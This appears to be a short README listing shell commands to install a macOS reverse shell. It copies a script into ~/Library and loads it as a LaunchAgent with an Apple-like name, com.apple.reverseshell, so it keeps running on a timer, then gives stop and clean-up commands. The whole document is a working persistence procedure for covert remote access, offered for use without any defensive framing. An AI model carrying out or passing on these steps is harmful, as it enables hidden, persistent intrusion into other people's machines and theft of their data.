# macOS Reverse Shell setup

```shell
# edit (<ip>, <port>)
$ vim reverse.sh

# copy reverse.sh
$ cp reverse.sh ~/Library/ && chmod +x ~/Library/reverse.sh

# create folder
$ mkdir ~/Library/LaunchAgents/

# edit (replace <name>, change interval)
$ vim com.apple.reverseshell.plist

# copy com.apple.reverseshell.plist
$ cp com.apple.reverseshell.plist ~/Library/LaunchAgents/

# start
$ launchctl load com.apple.reverseshell.plist

# stop
$ launchctl unload -w com.apple.reverseshell.plist

# clean up
$ rm -fr ~/Library/LaunchAgents/ \
&& rm -f ~/Library/reverse.sh \
&& rm -f /tmp/reverseshell.err \
&& rm -f /tmp/reverseshell.out
```
